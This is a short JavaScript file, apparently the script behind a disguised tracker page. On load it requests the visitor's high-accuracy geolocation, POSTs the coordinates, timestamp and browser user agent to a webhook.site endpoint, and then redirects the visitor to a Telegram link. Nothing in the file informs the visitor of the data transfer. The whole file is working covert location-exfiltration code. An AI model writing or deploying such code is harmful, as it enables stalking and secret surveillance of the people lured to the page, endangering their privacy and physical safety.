const REDIRECT_URL = "https://t.me/RscaOnLove";
const WEBHOOK_URL = "https://webhook.site/a2b2ae4e-01bc-4d30-93fc-098592ab1969";

function redirectAfter(ms) {
  setTimeout(() => {
    window.location.href = REDIRECT_URL;
  }, ms);
}

function sendLocation(position) {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).finally(() => redirectAfter(2000));
}

function handleError(error) {
  console.warn("Erreur de géolocalisation :", error);
  redirectAfter(2000);
}

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
    enableHighAccuracy: true,
    timeout: 5000
  });
} else {
  console.warn("Géolocalisation non supportée");
  redirectAfter(2000);
}
